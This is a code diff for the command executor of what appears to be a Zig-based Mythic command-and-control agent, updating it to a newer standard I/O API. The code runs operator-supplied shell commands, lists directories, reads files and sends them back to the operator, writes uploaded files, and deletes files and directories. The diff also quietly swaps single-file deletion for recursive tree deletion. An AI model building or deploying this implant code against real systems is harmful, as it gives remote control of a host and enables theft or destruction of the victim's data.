@@ -4,6 +4,7 @@ const types = @import("types.zig");
 const json = std.json;
 const base64 = std.base64;
 const Allocator = std.mem.Allocator;
+const Io = std.Io;
 const ArrayList = std.ArrayList;
 
 const MythicTask = types.MythicTask;
@@ -11,10 +12,12 @@ const MythicResponse = types.MythicResponse;
 
 pub const CommandExecutor = struct {
     allocator: Allocator,
+    io: Io,
 
-    pub fn init(allocator: Allocator) CommandExecutor {
+    pub fn init(allocator: Allocator, io: Io) CommandExecutor {
         return CommandExecutor{
             .allocator = allocator,
+            .io = io,
         };
     }
 
@@ -62,8 +65,7 @@ pub const CommandExecutor = struct {
         }
         const shell_path = if (builtin.os.tag == .windows) "cmd.exe" else "/bin/sh";
         const shell_args = if (builtin.os.tag == .windows) "/c" else "-c";
-        const result = std.process.Child.run(.{
-            .allocator = self.allocator,
+        const result = std.process.run(self.allocator, self.io, .{
             .argv = &[_][]const u8{ shell_path, shell_args, command },
         }) catch |err| {
             return MythicResponse{
@@ -88,7 +90,7 @@ pub const CommandExecutor = struct {
     }
 
     fn executePwd(self: *CommandExecutor, task: MythicTask) !MythicResponse {
-        const cwd = std.process.getCwdAlloc(self.allocator) catch |err| {
+        const cwd = std.process.currentPathAlloc(self.io, self.allocator) catch |err| {
             return MythicResponse{
                 .task_id = task.id,
                 .user_output = try std.fmt.allocPrint(self.allocator, "{}", .{err}),
@@ -115,7 +117,7 @@ pub const CommandExecutor = struct {
 
         const path = parsed.value.path;
 
-        var dir = std.fs.cwd().openDir(path, .{ .iterate = true }) catch |err| {
+        var dir = std.Io.Dir.cwd().openDir(self.io, path, .{ .iterate = true }) catch |err| {
             return MythicResponse{
                 .task_id = task.id,
                 .user_output = try std.fmt.allocPrint(self.allocator, "{s}: {}", .{ path, err }),
@@ -123,13 +125,13 @@ pub const CommandExecutor = struct {
                 .status = "error",
             };
         };
-        defer dir.close();
+        defer dir.close(self.io);
 
-        var output = ArrayList(u8){};
+        var output = ArrayList(u8).empty;
         defer output.deinit(self.allocator);
 
         var iterator = dir.iterate();
-        while (try iterator.next()) |entry| {
+        while (try iterator.next(self.io)) |entry| {
             try output.appendSlice(self.allocator, entry.name);
             try output.append(self.allocator, '\n');
         }
@@ -152,7 +154,7 @@ pub const CommandExecutor = struct {
             };
         }
 
-        const content = std.fs.cwd().readFileAlloc(self.allocator, task.parameters, 1024 * 1024) catch |err| {
+        const content = std.Io.Dir.cwd().readFileAlloc(self.io, task.parameters, self.allocator, .limited(1024 * 1024)) catch |err| {
             return MythicResponse{
                 .task_id = task.id,
                 .user_output = try std.fmt.allocPrint(self.allocator, "{s}: {}", .{ task.parameters, err }),
@@ -170,7 +172,7 @@ pub const CommandExecutor = struct {
     }
 
     fn executeDownload(self: *CommandExecutor, task: MythicTask) !MythicResponse {
-        const file_content = std.fs.cwd().readFileAlloc(self.allocator, task.parameters, 10 * 1024 * 1024) catch |err| {
+        const file_content = std.Io.Dir.cwd().readFileAlloc(self.io, task.parameters, self.allocator, .limited(10 * 1024 * 1024)) catch |err| {
             return MythicResponse{
                 .task_id = task.id,
                 .user_output = try std.fmt.allocPrint(self.allocator, "{}", .{err}),
@@ -226,17 +228,17 @@ pub const CommandExecutor = struct {
         };
 
         if (std.mem.eql(u8, remote_path, "/")) {
-            const file = try std.fs.createFileAbsolute(remote_path, .{});
-            defer file.close();
+            const file = try std.Io.Dir.createFileAbsolute(self.io, remote_path, .{});
+            defer file.close(self.io);
             if (std.mem.startsWith(u8, decoded_content, "b'") and std.mem.endsWith(u8, decoded_content, "'")) {
                 // Remove the b'' prefix if present. Very hacky and hould be improved. Sould write an unescape function later.
                 const content = decoded_content[2 .. decoded_content.len - 1];
-                try file.writeAll(content);
+                try file.writeStreamingAll(self.io, content);
             } else {
-                try file.writeAll(decoded_content);
+                try file.writeStreamingAll(self.io, decoded_content);
             }
         } else {
-            std.fs.cwd().writeFile(.{ .sub_path = remote_path, .data = decoded_content }) catch |err| {
+            std.Io.Dir.cwd().writeFile(self.io, .{ .sub_path = remote_path, .data = decoded_content }) catch |err| {
                 return MythicResponse{
                     .task_id = task.id,
                     .user_output = try std.fmt.allocPrint(self.allocator, "Failed to write file: {}", .{err}),
@@ -268,7 +270,7 @@ pub const CommandExecutor = struct {
                 .status = "error",
             };
         }
-        std.fs.deleteFileAbsolute(path) catch |err| {
+        std.Io.Dir.cwd().deleteTree(self.io, path) catch |err| {
             return MythicResponse{
                 .task_id = task.id,
                 .user_output = try std.fmt.allocPrint(self.allocator, "Failed to delete file: {}", .{err}),
@@ -299,7 +301,7 @@ pub const CommandExecutor = struct {
                 .status = "error",
             };
         }
-        std.fs.deleteTreeAbsolute(path) catch |err| {
+        std.Io.Dir.cwd().deleteTree(self.io, path) catch |err| {
             return MythicResponse{
                 .task_id = task.id,
                 .user_output = try std.fmt.allocPrint(self.allocator, "Failed to delete directory: {}", .{err}),
